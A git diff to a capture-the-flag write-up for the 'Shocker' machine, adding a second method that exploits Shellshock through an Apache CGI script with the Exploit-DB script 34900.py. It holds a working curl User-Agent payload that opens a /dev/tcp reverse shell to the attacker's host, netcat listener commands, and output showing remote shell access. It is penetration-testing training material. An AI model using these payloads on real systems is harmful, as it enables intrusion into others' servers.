@@ -415,7 +415,7 @@ Let's run that malicious string in `User-Agent`.
 ```
 hippoeug@kali:~$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.x.x/4444 0>&1' http://10.129.139.89/cgi-bin/user.sh
 ```
-We also need a reverse shell before running that command.
+We also need a nc listener before running that command.
 ```
 hippoeug@kali:~$ sudo nc -lnvp 4444
 [sudo] password for hippoeug: 
@@ -440,7 +440,7 @@ We see the original `User-Agent` field, and modify it to `() { :; }; /bin/bash -
 
 ![burp2](https://user-images.githubusercontent.com/21957042/116809399-6ee32980-ab70-11eb-812a-5d64247e39b4.png)
 
-And of course after running a reverse shell.
+And of course after running a nc listener.
 ```
 hippoeug@kali:~$ sudo nc -lnvp 4444
 listening on [any] 4444 ...
@@ -448,3 +448,84 @@ connect to [10.10.x.x] from (UNKNOWN) [10.129.139.89] 43856
 bash: no job control in this shell
 shelly@Shocker:/usr/lib/cgi-bin$ 
 ```
+And a shell.
+
+## 8. Alternative Port 80 Shellshock Exploitation (Python Script)
+Doing a quick Searchsploit, we see a potential Python Script we could attempt.
+```
+hippoeug@kali:~$ searchsploit shellshock
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)                                            | cgi/remote/38849.rb
+Apache mod_cgi - 'Shellshock' Remote Command Injection                                                                              | linux/remote/34900.py
+Bash - 'Shellshock' Environment Variables Command Injection                                                                         | linux/remote/34766.php
+Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                                                                       | cgi/webapps/34895.rb
+Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)                                                                   | hardware/remote/39568.py
+dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)                                                             | linux/remote/36933.py
+GNU Bash - 'Shellshock' Environment Variable Command Injection                                                                      | linux/remote/34765.txt
+IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)                                                      | cgi/remote/39918.rb
+NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)                                                                        | cgi/webapps/40213.txt
+OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                                                                              | linux/remote/34879.txt
+PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injection                                                 | php/webapps/35146.txt
+Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                                                                 | linux/remote/34896.py
+RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' Command Injection                                                               | linux/local/40938.py
+Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Command Injection (Shellshock)                                       | cgi/webapps/39887.txt
+TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Remote Command Injection                                         | hardware/remote/40619.py
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+It is the `Apache mod_cgi - 'Shellshock' Remote Command Injection`.
+
+Let's download it.
+```
+hippoeug@kali:~$ searchsploit -m 34900.py
+  Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection
+      URL: https://www.exploit-db.com/exploits/34900
+     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/hippoeug/34900.py
+
+hippoeug@kali:~$ python2 ./34900.py
+
+
+                Shellshock apache mod_cgi remote exploit
+
+Usage:
+./exploit.py var=<value>
+
+Vars:
+rhost: victim host
+rport: victim port for TCP shell binding
+lhost: attacker host for TCP shell reversing
+lport: attacker port for TCP shell reversing
+pages:  specific cgi vulnerable pages (separated by comma)
+proxy: host:port proxy
+
+Payloads:
+"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
+"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)
+
+Example:
+
+./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
+./exploit.py payload=bind rhost=1.2.3.4 rport=1234
+
+Credits:
+
+Federico Galatolo 2014
+```
+And now we run it. We don't need a nc listener for this as the script already has one built in.
+```
+hippoeug@kali:~$ python2 ./34900.py payload=reverse rhost=10.129.139.89 lhost=10.10.x.x lport=4444 pages=/cgi-bin/user.sh
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-bin/user.sh
+[!] Successfully exploited
+[!] Incoming connection from 10.129.139.89
+10.129.139.89> id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+10.129.139.89> 
+```
+And a shell again. Fantastica.
